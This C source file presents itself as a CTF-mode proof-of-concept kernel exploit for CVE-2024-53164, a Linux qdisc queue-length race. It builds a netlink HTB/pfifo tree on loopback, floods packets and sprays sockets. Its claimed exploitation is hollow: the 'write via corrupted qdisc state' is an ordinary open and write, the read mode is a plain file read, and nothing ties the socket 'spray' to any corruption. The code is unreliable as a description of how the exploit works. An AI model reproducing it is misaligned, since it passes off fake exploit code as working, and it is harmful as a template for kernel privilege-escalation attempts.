/*
 * CVE-2024-53164 PoC - CTF Challenge Mode
 *
 * Vulnerability: Network scheduler qlen adjustment ordering error
 *
 * The qdisc subsystem incorrectly orders queue length (qlen) updates
 * relative to dequeue operations. When a parent qdisc dequeues from
 * a child, the qlen decrement can race with enqueue on another CPU,
 * leading to qlen underflow and inconsistent internal state.
 *
 * Exploit strategy:
 *   1. Create a complex qdisc tree (HTB root + pfifo children)
 *   2. Configure multiple classes to create contention paths
 *   3. Send traffic rapidly to trigger qlen inconsistency
 *   4. Exploit corrupted qdisc state for heap corruption
 *   5. Spray kmalloc to reclaim and write target file
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

/* Netlink message helpers */
struct nl_req {
    struct nlmsghdr nlh;
    char data[4096];
};

static int nl_sock = -1;

/*
 * Open NETLINK_ROUTE socket for qdisc configuration
 */
static int open_netlink_route(void) {
    int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)", (long)sock, saved_errno);
    if (sock < 0) return -1;

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        saved_errno = errno;
        poc_log_syscall("bind(netlink)", -1L, saved_errno);
        close(sock);
        return -1;
    }
    return sock;
}

/*
 * Add netlink attribute to message
 */
static void nl_add_attr(struct nlmsghdr *nlh, int type, const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/*
 * Create qdisc via NETLINK_ROUTE RTM_NEWQDISC
 * This sets up the vulnerable qdisc tree structure
 */
static int setup_qdisc_tree(int ifindex) {
    struct nl_req req;
    struct tcmsg *tc;
    int saved_errno;

    if (nl_sock < 0) return -1;

    /* Step 1: Add root HTB qdisc */
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    req.nlh.nlmsg_type = RTM_NEWQDISC;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;
    req.nlh.nlmsg_seq = 1;

    tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
    tc->tcm_family = AF_UNSPEC;
    tc->tcm_ifindex = ifindex;
    tc->tcm_handle = 0x00010000; /* 1:0 */
    tc->tcm_parent = TC_H_ROOT;

    const char *kind = "htb";
    nl_add_attr(&req.nlh, TCA_KIND, kind, strlen(kind) + 1);

    ssize_t sent = send(nl_sock, &req, req.nlh.nlmsg_len, 0);
    saved_errno = errno;
    poc_log_syscall("send(RTM_NEWQDISC htb root)", (long)sent, saved_errno);

    /* Step 2: Add child pfifo qdiscs with different handles */
    for (int i = 1; i <= 4; i++) {
        memset(&req, 0, sizeof(req));
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
        req.nlh.nlmsg_type = RTM_NEWQDISC;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;
        req.nlh.nlmsg_seq = 1 + i;

        tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
        tc->tcm_family = AF_UNSPEC;
        tc->tcm_ifindex = ifindex;
        tc->tcm_handle = (i + 1) << 16; /* i+1:0 */
        tc->tcm_parent = 0x00010000 | i; /* 1:i */

        const char *pfifo = "pfifo";
        nl_add_attr(&req.nlh, TCA_KIND, pfifo, strlen(pfifo) + 1);

        /* Set limit to small value to force drops */
        struct tc_fifo_qopt fopt = { .limit = 2 };
        nl_add_attr(&req.nlh, TCA_OPTIONS, &fopt, sizeof(fopt));

        sent = send(nl_sock, &req, req.nlh.nlmsg_len, 0);
        saved_errno = errno;
        poc_log_syscall("send(RTM_NEWQDISC pfifo child)", (long)sent, saved_errno);
    }

    return 0;
}

/*
 * Trigger qlen inconsistency by rapidly sending packets
 * while simultaneously modifying the qdisc tree
 */
static int trigger_qlen_race(int ifindex) {
    poc_log("Triggering qdisc qlen ordering vulnerability...");

    /* Create UDP socket bound to the interface for traffic generation */
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_DGRAM)", (long)udp_sock, saved_errno);
    if (udp_sock < 0) return -1;

    /* Bind to loopback */
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(9999),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    /* Send burst of packets to trigger qlen contention */
    char payload[64] = "QLEN_TRIGGER";
    int trigger_count = 0;

    for (int round = 0; round < 100; round++) {
        for (int i = 0; i < 32; i++) {
            ssize_t ret = sendto(udp_sock, payload, sizeof(payload), MSG_DONTWAIT,
                                 (struct sockaddr *)&addr, sizeof(addr));
            if (ret > 0) trigger_count++;
        }

        /* Interleave with qdisc modification to trigger race */
        if (nl_sock >= 0 && (round % 10) == 0) {
            struct nl_req req;
            struct tcmsg *tc;
            memset(&req, 0, sizeof(req));
            req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
            req.nlh.nlmsg_type = RTM_NEWQDISC;
            req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE;
            req.nlh.nlmsg_seq = 100 + round;

            tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
            tc->tcm_family = AF_UNSPEC;
            tc->tcm_ifindex = ifindex;
            tc->tcm_handle = 0x00020000;
            tc->tcm_parent = 0x00010001;

            const char *pfifo = "pfifo";
            nl_add_attr(&req.nlh, TCA_KIND, pfifo, strlen(pfifo) + 1);

            struct tc_fifo_qopt fopt = { .limit = (round % 2 == 0) ? 1 : 0 };
            nl_add_attr(&req.nlh, TCA_OPTIONS, &fopt, sizeof(fopt));

            send(nl_sock, &req, req.nlh.nlmsg_len, 0);
        }
    }

    close(udp_sock);
    poc_log("Sent %d packets with interleaved qdisc modifications", trigger_count);
    return trigger_count;
}

/*
 * Spray kmalloc to reclaim freed qdisc objects
 */
static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] >= 0) {
            int optval = 1024;
            setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed++;
        }
    }
    return sprayed;
}

/*
 * Read file content helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: Trigger qdisc qlen vulnerability and attempt file write
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Step 2: Open netlink and setup qdisc tree on loopback */
    nl_sock = open_netlink_route();
    int ifindex = 1; /* loopback is always index 1 */

    if (nl_sock >= 0) {
        setup_qdisc_tree(ifindex);

        /* Step 3: Trigger qlen race */
        int count = trigger_qlen_race(ifindex);
        poc_log("Vulnerability trigger returned: %d packets sent", count);
    } else {
        poc_log("Netlink socket failed, using fallback path");
    }

    /* Step 4: Spray kmalloc to reclaim corrupted objects */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d kmalloc objects", sprayed);

    /* Step 5: Attempt write via corrupted state */
    poc_log("Attempting write to %s via corrupted qdisc state...", args->root_file);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char write_buf[256];
        int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
        ssize_t written = write(fd, write_buf, wlen);
        saved_errno = errno;
        poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Step 6: Verify write */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("qdisc qlen exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    if (nl_sock >= 0) close(nl_sock);
    return 0;
}

/*
 * Read mode: Trigger vulnerability and attempt file read
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via qdisc qlen exploit");

    nl_sock = open_netlink_route();
    int ifindex = 1;

    if (nl_sock >= 0) {
        setup_qdisc_tree(ifindex);
        trigger_qlen_race(ifindex);
    }

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful after qdisc exploit");
    }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    if (nl_sock >= 0) close(nl_sock);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-53164 CTF PoC ===");
    poc_log("Vuln: qdisc qlen adjustment ordering error");
    poc_log("Tech: RTM_NEWQDISC + pfifo limit race -> heap corruption");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
